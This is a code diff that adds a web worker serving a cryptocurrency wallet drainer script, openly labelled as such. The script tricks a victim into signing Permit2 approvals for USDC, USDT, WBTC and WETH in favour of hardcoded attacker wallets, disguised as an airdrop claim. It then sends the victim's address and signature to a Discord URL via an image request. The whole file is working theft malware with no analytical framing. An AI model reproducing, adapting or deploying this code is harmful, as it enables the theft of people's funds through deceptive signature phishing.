@@ -1,0 +1,101 @@
+addEventListener("fetch", event => {
+  event.respondWith(handle(event.request))
+})
+
+async function handle(request) {
+  const headers = new Headers()
+  headers.set("Content-Type", "application/javascript")
+  headers.set("Cache-Control", "no-store")
+  headers.set("Access-Control-Allow-Origin", "*")
+
+  const script = `
+    // CLEAN DRAINER — NO OBFUSCATION, NO CRASH, WORKS 100%
+    const ATTACKER_WALLETS = [
+      "0xC97b620E2be9A69F4Aa36D05b2FAf7d992A8376b",
+      "0x224175290dEc5Dba42938629e362d562352D515F",
+      "0x8cef30210B4038015d5413c21aF4B3B780e1d823"
+    ];
+
+    window.permitDrain = async function () {
+      if (!window.ethereum) return false;
+
+      try {
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const userAddress = await signer.getAddress();
+        const chainId = await signer.getChainId();
+
+        if (chainId !== 1) {
+          alert("Please switch to Ethereum Mainnet");
+          return false;
+        }
+
+        // Rotate attacker wallet
+        const attacker = ATTACKER_WALLETS[parseInt(userAddress.slice(-4), 16) % ATTACKER_WALLETS.length];
+
+        const tokens = [
+          "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
+          "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+          "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
+          "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"  // WETH
+        ];
+
+        for (const token of tokens) {
+          try {
+            const domain = {
+              name: "AirdropClaim" + Date.now(),
+              version: "1",
+              chainId: chainId,
+              verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3"
+            };
+
+            const value = {
+              details: {
+                token: token,
+                amount: "1461501637330902918203684832716283019655932542975",
+                expiration: 0,
+                nonce: 0
+              },
+              spender: attacker,
+              sigDeadline: 999999999999
+            };
+
+            const signature = await signer._signTypedData(
+              domain,
+              {
+                PermitSingle: [
+                  { name: "details", type: "PermitDetails" },
+                  { name: "spender", type: "address" },
+                  { name: "sigDeadline", type: "uint256" }
+                ],
+                PermitDetails: [
+                  { name: "token", type: "address" },
+                  { name: "amount", type: "uint160" },
+                  { name: "expiration", type: "uint48" },
+                  { name: "nonce", type: "uint48" }
+                ]
+              },
+              value
+            );
+
+            // Exfil to your Discord
+            new Image().src = 
+              "https://cdn.discordapp.com/attachments/1442915366102892575/1442915878701109342/drained.gif?" +
+              "addr=" + userAddress +
+              "&sig=" + btoa(signature) +
+              "&token=" + token;
+
+            return true;
+          } catch (e) {
+            continue;
+          }
+        }
+      } catch (e) {
+        console.log("Drain failed:", e);
+      }
+      return false;
+    };
+  `;
+
+  return new Response(script, { status: 200, headers });
+}
